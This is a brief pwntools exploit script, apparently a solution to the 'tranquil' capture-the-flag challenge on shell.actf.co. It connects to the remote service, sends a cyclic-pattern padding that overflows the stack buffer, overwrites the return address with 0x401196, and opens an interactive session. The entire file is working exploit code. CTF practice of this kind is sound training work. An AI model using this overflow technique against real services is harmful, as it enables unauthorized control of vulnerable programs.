from pwn import *

#p = process("./tranquil")
p = remote("shell.actf.co", 21830)
p.recv()

payload = cyclic()[:cyclic_find("saaa")] + p64(0x401196)

p.sendline(payload)

p.interactive()
